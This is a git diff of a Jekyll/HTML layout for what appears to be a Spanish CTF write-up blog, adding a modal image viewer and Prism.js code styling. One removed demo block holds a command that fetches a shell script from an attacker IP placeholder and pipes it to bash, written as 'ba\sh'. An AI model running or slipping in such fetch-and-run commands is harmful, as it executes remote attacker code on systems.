@@ -1,12 +1,105 @@
 <!DOCTYPE html>
-<html lang="en">
+<html>
 <head>
-  <!-- Incluir el CSS de Prism.js para resaltado de sintaxis -->
-  <link href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism-tomorrow.min.css" rel="stylesheet" />
+  {% include head.html %}
+  <!-- Incluye Prism.js CSS -->
+  <link href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" rel="stylesheet" />
 
   <style>
-    /* Estilo para el contenedor principal */
-    .code-container {
+/* Estilos para el modal */
+.modal {
+  display: flex;
+  position: fixed;
+  z-index: 1;
+  left: 0;
+  top: 0;
+  width: 100%;
+  height: 100%;
+  overflow: auto;
+  background-color: rgba(0, 0, 0, 0.8);
+  opacity: 0;
+  transition: opacity 0.3s ease;
+  display: flex; /* Usamos flexbox para centrar el contenido */
+  align-items: center; /* Centra verticalmente */
+  justify-content: center; /* Centra horizontalmente */
+}
+
+/* Clase que muestra el modal */
+.modal.show {
+  opacity: 1;
+}
+
+/* Estilos para el contenido del modal */
+.modal-content {
+  position: absolute;
+  top: 50%;
+  left: 50%;
+  width: 100%;
+  max-width: 1000px; /* Limita el ancho máximo para el contenido del modal */
+  max-height: 80vh; /* Limita la altura máxima para evitar que el modal sea demasiado alto */
+  background: #cccccc63;
+  border-radius: 8px;
+  animation: zoomIn 0.3s ease forwards; /* Animación con el estado final */
+  padding: 5px;
+}
+/* Animación para el zoom-in del contenido del modal */
+@keyframes zoomIn {
+  from {
+    opacity: 0;
+    transform: translate(-50%, -50%) scale(0.8); /* Comienza escalado desde el centro */
+  }
+  to {
+    opacity: 1;
+    transform: translate(-50%, -50%) scale(1); /* Termina en el tamaño final desde el centro */
+  }
+
+}
+
+/* Estilos para el botón de cerrar */
+.close {
+  position: absolute;
+  top: 0%;
+  right: 0%;
+  left: -70%;
+  color: #ccc;
+  font-size: 40px;
+  font-weight: bold;
+  transition: color 0.3s ease;
+  cursor: pointer;
+}
+
+.close:hover,
+.close:focus {
+  color: #bbb;
+  text-decoration: none;
+}
+
+/* Estilos responsivos para pantallas pequeñas */
+@media only screen and (max-width: 700px) {
+  .modal-content {
+    position: absolute;
+    top: 50%;
+    left: 45%;
+    right: 45%;
+    width: 100%;
+    max-width: 1000px; /* Limita el ancho máximo para el contenido del modal */
+    max-height: 80vh; /* Limita la altura máxima para evitar que el modal sea demasiado alto */
+    background: #cccccc63;
+    border-radius: 8px;
+    animation: zoomIn 0.3s ease forwards; /* Animación con el estado final */
+    padding: 5px;
+  }
+
+  .close {
+    top: 25%;
+    right: 45%;
+    left: 45%;
+    font-size: 35px; /* Reduce el tamaño del botón de cerrar en pantallas pequeñas */
+  }
+}
+
+ /* Estilo para el contenedor principal */
+ .code-container {
       display: inline-block;
       text-align: left;
       margin-top: 20px;
@@ -55,30 +148,114 @@
     .copy-button:hover {
       background-color: #45a049;
     }
+
   </style>
 </head>
+
 <body>
-
-  <!-- Contenedor del código -->
-  <div class="code-container">
-    <div class="code-header">
-      Bash
-      <button class="copy-button" onclick="copyToClipboard()">Copiar</button>
+  {% include navbar.html %}
+  <section class="hero is-fullheight has-text-centered" id="post">
+    <div class="hero-body">
+      <div class="container">
+        <a href="{{page.url | relative_url}}" class="has-text-black" id="title">
+          <h1 class="title has-text-centered is-2 has-text-weight-semibold ">{{page.title}}</h1>
+        </a>
+        <hr class="has-background-black">
+        <div class="columns is-variable is-5 has-text-centered">
+          <div class="column is-6">
+            <div style="text-align: center; ">
+              <img src="{{page.post-image}}" alt="{{page.title}}" id="post-image">
+            </div>
+          </div>
+          <div class="subtitle column is-5 has-text-left-desktop has-text-left-fullhd has-text-left-tablet has-text-center-mobile" style="text-align: left;" ">
+            {% unless page.description.size == 0 %}
+            <p id="description" class="content is-small has-text-weight-medium is-uppercase">
+              {{page.description | strip | strip_html | strip_newlines }}
+              <!-- Enlace añadido aquí -->
+              <p class="subtitle is-uppercase is-6 has-text-weight-normal has-text-black-ter">Enlace de la room: 
+                <b><a href="{{ page.enlace | escape }}" target="page.enlace">{{page.title}}</a></b>
+              </p>
+                {% endunless %}
+              <p class="subtitle is-6 is-uppercase has-text-weight-normal has-text-black-ter">Dificultad de la room: 
+                <b>{{ page.difficulty | escape }}</b>
+              </p>
+            <p class="subtitle is-6 is-uppercase has-text-weight-normal has-text-black-ter">Publicado en
+              <b>{{ page.date | date: "%-B %d, %Y" }}</b> by <a href="{% if site.author-url %}{{site.author-url}}{% else %}{{site.url}}{{site.baseurl}}/#about{% endif %}" target="_blank"><b class="has-text-link"><u>{{site.author-name}}</u></b>
+              </a>
+            </p>
+            {%- assign tags = page.tags -%}
+            {%- unless tags.size == 0 -%}
+            <p class="subtitle is-uppercase">
+              <i class="fas fa-tags"></i>
+              {% assign i = 0 %}
+              {% for tags in page.tags %}
+              <span class="tag is-link">{{page.tags[i]}}</span>
+              {% assign i = i | plus:1 %}
+              {% endfor %}
+            </p>
+            {%- endunless -%}
+            {% assign words = content | number_of_words %}
+            {%- unless content.size == 0 -%}
+            <!-- <p class="subtitle is-uppercase"><i class="fas fa-clock"></i> <b class="has-text-link">
+                {{ words | divided_by:180 }} min
+              </b>READ</p> -->
+            {%- endunless -%}
+          </div>
+        </div>
+        <div class="content has-text-justified-desktop has-text-justified-fullhd has-text-justified has-text-justified-tablet has-text-left-mobile">
+          <p>{{ content }}</p>
+        </div>
+        {% unless site.disqus-shortname == "" %}
+        <div class="disqus-comments" id="disqus_thread"></div>
+        {% endunless %}
+      </div>
     </div>
-    <pre><code class="language-bash">curl http://ip_nuestra/nombre_shell | ba\sh</code></pre>
-  </div>
+  </section>
+  {% include footer.html %}
 
-  <!-- Incluir el script de Prism.js -->
+  <!-- Modal -->
+  <div id="myModal" class="modal">
+    <span class="close" onclick="closeModal()">&times;</span>
+    <img class="modal-content" id="img01">
+  </div>
+ <!-- Prism.js Script -->
   <script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js"></script>
 
   <script>
-    function copyToClipboard() {
-      const code = document.querySelector('.code-container code').innerText;
+      function copyToClipboard() {
+      const code = document.querySelector('code').innerText;
       navigator.clipboard.writeText(code).then(() => {
         alert("Código copiado al portapapeles!");
       });
     }
-  </script>
 
+     function openModal(imgSrc) {
+      var modal = document.getElementById("myModal");
+      var modalImg = document.getElementById("img01");
+
+      modal.style.display = "block";
+      setTimeout(function() {
+        modal.classList.add('show');
+      }, 10); // Delay to trigger the animation
+      modalImg.src = imgSrc;
+    }
+
+    function closeModal(event) {
+      if (event) event.stopPropagation(); // Prevents closing when clicking the close button
+      var modal = document.getElementById("myModal");
+      modal.classList.remove('show');
+      setTimeout(function() {
+        modal.style.display = "none";
+      }, 300); // Match this duration with the CSS animation duration
+    }
+
+    // Close modal when clicking outside the content
+    window.onclick = function(event) {
+      var modal = document.getElementById("myModal");
+      if (event.target == modal) {
+        closeModal();
+      }
+    }
+  </script>
 </body>
 </html>
